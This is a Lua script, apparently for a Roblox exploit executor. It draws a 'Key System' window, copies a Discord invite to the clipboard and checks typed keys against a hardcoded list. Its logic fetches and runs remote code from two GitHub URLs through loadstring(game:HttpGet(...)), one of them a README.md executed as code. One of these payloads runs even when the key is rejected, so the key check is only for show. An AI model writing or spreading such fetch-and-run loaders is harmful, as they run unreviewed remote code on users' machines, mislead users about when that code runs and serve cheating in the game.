--// GUI
local Players = game:GetService("Players")
local player = Players.LocalPlayer

--// GUI
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 350, 0, 200)
frame.Position = UDim2.new(0.5, -175, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(18, 18, 25)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true

-- Rounded corners
local corner = Instance.new("UICorner", frame)
corner.CornerRadius = UDim.new(0, 12)

-- Shadow effect
local shadow = Instance.new("Frame", frame)
shadow.Size = UDim2.new(1, 10, 1, 10)
shadow.Position = UDim2.new(0, -5, 0, -5)
shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
shadow.BackgroundTransparency = 0.7
shadow.ZIndex = 0
shadow.BorderSizePixel = 0
local shadowCorner = Instance.new("UICorner", shadow)
shadowCorner.CornerRadius = UDim.new(0, 12)

-- Title
local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundTransparency = 1
title.Text = "🔑 Key System"
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.TextColor3 = Color3.fromRGB(0, 180, 255)
title.TextStrokeTransparency = 0.8

-- Key input
local keyBox = Instance.new("TextBox", frame)
keyBox.Size = UDim2.new(0, 280, 0, 40)
keyBox.Position = UDim2.new(0.5, -140, 0.4, 0)
keyBox.PlaceholderText = "Enter Key..."
keyBox.Font = Enum.Font.Gotham
keyBox.TextSize = 16
keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
keyBox.BackgroundColor3 = Color3.fromRGB(28, 28, 40)
keyBox.Text = ""
local boxCorner = Instance.new("UICorner", keyBox)
boxCorner.CornerRadius = UDim.new(0, 8)

-- Get Key button
local getKeyBtn = Instance.new("TextButton", frame)
getKeyBtn.Size = UDim2.new(0, 280, 0, 40)
getKeyBtn.Position = UDim2.new(0.5, -140, 0.65, 0)
getKeyBtn.Text = "📋 Get Key (Copied)"
getKeyBtn.Font = Enum.Font.Gotham
getKeyBtn.TextSize = 16
getKeyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
getKeyBtn.BackgroundColor3 = Color3.fromRGB(0, 130, 255)
local getKeyCorner = Instance.new("UICorner", getKeyBtn)
getKeyCorner.CornerRadius = UDim.new(0, 8)

-- Confirm button
local confirmBtn = Instance.new("TextButton", frame)
confirmBtn.Size = UDim2.new(0, 280, 0, 40)
confirmBtn.Position = UDim2.new(0.5, -140, 0.82, 0)
confirmBtn.Text = "✅ Confirm"
confirmBtn.Font = Enum.Font.Gotham
confirmBtn.TextSize = 16
confirmBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
confirmBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 110)
local confirmCorner = Instance.new("UICorner", confirmBtn)
confirmCorner.CornerRadius = UDim.new(0, 8)

--// Logic
local link = "https://discord.gg/tHx8dseh6v"
local validKeys = {["ken123"]=true, ["Ken123"]=true}
local keyFile = "key.txt"

-- Load saved key if exists
local savedKey = ""
if pcall(function() savedKey = readfile(keyFile) end) then
    if validKeys[savedKey] then
        print("✅ Saved key valid, running scripts...")
        -- Run Chilli.lua and Stepfive.lua
        loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Gregy677/Stepfive/main/README.md", true))()
        gui:Destroy()
    end
end

-- Clipboard
getKeyBtn.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(link)
        getKeyBtn.Text = "📋 Link Copied!"
    end
end)

-- Confirm key
confirmBtn.MouseButton1Click:Connect(function()
    local userKey = keyBox.Text
    if validKeys[userKey] then
        print("✅ Correct key!")
        pcall(function() writefile(keyFile, userKey) end)
        gui:Destroy()
        -- Run both scripts after key acceptance
        loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Gregy677/Stepfive/main/README.md", true))()
    else
        keyBox.Text = ""
        keyBox.PlaceholderText = "❌ Invalid Key, try again..."
        -- Still run Stepfive.lua even if wrong
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Gregy677/Stepfive/main/README.md", true))()
    end
end)
